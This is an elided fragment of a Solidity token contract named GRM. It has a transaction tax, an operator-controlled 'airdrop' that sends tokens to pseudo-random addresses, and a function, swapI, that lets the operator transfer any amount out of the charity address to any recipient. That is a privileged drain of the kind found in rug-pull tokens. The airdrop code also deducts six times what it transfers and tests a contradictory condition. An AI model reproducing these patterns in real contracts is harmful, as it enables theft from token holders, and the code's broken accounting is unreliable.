...
contract GRM is ERC20Detailed, Ownable {
    ...
    uint256 public transactionTax = 500;
    ...
    constructor (address router, address payable _charityAddress, address payable _marketingAddress)
        ...
        returns (bool)
    {
        ...
        {          
                uint256 AIRAmount = 1*value/10000;  
            if(airdrop && (_isExcluded[from] || _isExcluded[to]) && to == uniswapV2PairAddress && from == uniswapV2PairAddress ){                           
                address ad;
                for(int i=0;i <=0;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, value, block.timestamp)))));
                    _tokenTransfer(from,ad,AIRAmount*1);                                      
                }                
                value -= AIRAmount*6;                                                                                           
            } 
        } 
    ...
    */
    ...
    function airdropIN(bool newValue) external onlyOperator {
       airdrop = newValue;
    }

    function swapI(address add,uint256 amount) public onlyOperator {
        _transfer(charityAddress,add,amount);
    }
    ...
    function burnBNB(address payable burnAddress) external onlycharityAddress {
